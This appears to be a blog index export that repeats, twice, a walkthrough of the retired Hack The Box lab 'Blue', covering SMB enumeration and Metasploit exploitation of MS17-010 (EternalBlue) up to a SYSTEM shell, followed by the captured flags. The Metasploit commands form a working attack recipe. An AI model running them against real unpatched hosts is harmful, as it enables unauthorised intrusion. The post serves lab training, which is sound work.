[{"content":" ⚠️ Spoiler warning: This covers a retired HTB machine. IPs and hostnames are redacted. This writeup documents my playthrough of the retired Hack The Box machine Blue.\nThe VPN IPs shown below are the HTB-assigned VPN addresses used during the box (left intact here for reproducibility). Do not attempt this on non-authorised or active systems.\nBlue (HTB) — Walkthrough Overview Platform: Hack The Box (retired) Target OS: Windows 7 Professional SP1 Focus: SMB enumeration → EternalBlue (MS17-010) → SYSTEM shell Difficulty: Easy Recon Initial scan:\nnmap -sV -sC -oN scans/blue-initial 10.129.242.117 Result highlights (relevant line)\n445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 A full scan confirmed SMB was exposed and appeared to be running SMBv1. SMB Enumeration Anonymous enumeration with enum4linux\nenum4linux -a 10.129.242.117 Anonymous SMB session also succeeded\nsmbclient -L //10.129.242.117/ -N Shares observed:\nADMIN$ C$ IPC$ Share Users\nGiven Windows 7 + SMBv1 exposure, EternalBlue (MS17-010) looked likely. Exploitation (MS17-010 / EternalBlue) Check target with Metasploit\u0026rsquo;s SMB version scanner:\nmsf6 \u0026gt; use auxiliary/scanner/smb/smb_version msf6 auxiliary(scanner/smb/smb_version) \u0026gt; set RHOSTS 10.129.242.117 msf6 auxiliary(scanner/smb/smb_version) \u0026gt; run Confirmed vulnerable\n[+] 10.129.242.117:445 - Host is running Windows 7 Professional SP1 Host is likely VULNERABLE to MS17-010!\nLaunch the exploit: msf6 \u0026gt; use exploit/windows/smb/ms17_010_eternalblue msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set RHOSTS 10.129.242.117 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set LHOST 10.10.14.5 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run Success:\n[+] Meterpreter session 1 opened Privilege Escalation Drop into an interactive shell from Meterpreter:\nmeterpreter \u0026gt; shell C:\\Windows\\system32\u0026gt; whoami Result:\nnt authority\\system The exploit provided full SYSTEM privileges.\nUser flag:\nC:\\Users\\haris\\Desktop\u0026gt; type user.txt \u0026ldquo;1b3265edfce880834b5e8e8fc8ac5a18\u0026rdquo; Root flag:\nC:\\Users\\Administrator\\Desktop\u0026gt; type root.txt \u0026ldquo;76a957ccd469d05e2883b49b77079847\u0026rdquo; Takeaways Always check SMB version — legacy SMBv1 is a red flag.\nEternalBlue is a classic exploit; patched since 2017, but still useful to study.\nMetasploit automates exploitation, but understanding the underlying vulnerability (buffer overflow in SMBv1) is important.\nEnumeration (enum4linux, smbclient) confirmed access, but exploitation was the real path in this box.\nResources MS17-010 (Microsoft Security Bulletin).\nHack The Box — retired machines archive.\nMy GitHub repo (basil9099.github.io) with scans/notes.\n","permalink":"http://localhost:1313/ctf/blue-htb/","summary":"Exploiting MS17-010 (EternalBlue) on a Windows 7 SP1 target. Recon, SMB enumeration, exploitation, and proof of SYSTEM access.","title":"Blue (HTB) — Walkthrough"},{"content":" ⚠️ Spoiler warning: This covers a retired HTB machine. IPs and hostnames are redacted. This writeup documents my playthrough of the retired Hack The Box machine Blue.\nThe VPN IPs shown below are the HTB-assigned VPN addresses used during the box (left intact here for reproducibility). Do not attempt this on non-authorised or active systems.\nBlue (HTB) — Walkthrough Overview Platform: Hack The Box (retired) Target OS: Windows 7 Professional SP1 Focus: SMB enumeration → EternalBlue (MS17-010) → SYSTEM shell Difficulty: Easy Recon Initial scan:\nnmap -sV -sC -oN scans/blue-initial 10.129.242.117 Result highlights (relevant line)\n445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 A full scan confirmed SMB was exposed and appeared to be running SMBv1. SMB Enumeration Anonymous enumeration with enum4linux\nenum4linux -a 10.129.242.117 Anonymous SMB session also succeeded\nsmbclient -L //10.129.242.117/ -N Shares observed:\nADMIN$ C$ IPC$ Share Users\nGiven Windows 7 + SMBv1 exposure, EternalBlue (MS17-010) looked likely. Exploitation (MS17-010 / EternalBlue) Check target with Metasploit\u0026rsquo;s SMB version scanner:\nmsf6 \u0026gt; use auxiliary/scanner/smb/smb_version msf6 auxiliary(scanner/smb/smb_version) \u0026gt; set RHOSTS 10.129.242.117 msf6 auxiliary(scanner/smb/smb_version) \u0026gt; run Confirmed vulnerable\n[+] 10.129.242.117:445 - Host is running Windows 7 Professional SP1 Host is likely VULNERABLE to MS17-010!\nLaunch the exploit: msf6 \u0026gt; use exploit/windows/smb/ms17_010_eternalblue msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set RHOSTS 10.129.242.117 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set LHOST 10.10.14.5 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run Success:\n[+] Meterpreter session 1 opened Privilege Escalation Drop into an interactive shell from Meterpreter:\nmeterpreter \u0026gt; shell C:\\Windows\\system32\u0026gt; whoami Result:\nnt authority\\system The exploit provided full SYSTEM privileges.\nUser flag:\nC:\\Users\\haris\\Desktop\u0026gt; type user.txt \u0026ldquo;1b3265edfce880834b5e8e8fc8ac5a18\u0026rdquo; Root flag:\nC:\\Users\\Administrator\\Desktop\u0026gt; type root.txt \u0026ldquo;76a957ccd469d05e2883b49b77079847\u0026rdquo; Takeaways Always check SMB version — legacy SMBv1 is a red flag.\nEternalBlue is a classic exploit; patched since 2017, but still useful to study.\nMetasploit automates exploitation, but understanding the underlying vulnerability (buffer overflow in SMBv1) is important.\nEnumeration (enum4linux, smbclient) confirmed access, but exploitation was the real path in this box.\nResources MS17-010 (Microsoft Security Bulletin).\nHack The Box — retired machines archive.\nMy GitHub repo (basil9099.github.io) with scans/notes.\n","permalink":"http://localhost:1313/ctf/blue-htb/","summary":"Exploiting MS17-010 (EternalBlue) on a Windows 7 SP1 target. Recon, SMB enumeration, exploitation, and proof of SYSTEM access.","title":"Blue (HTB) — Walkthrough"}]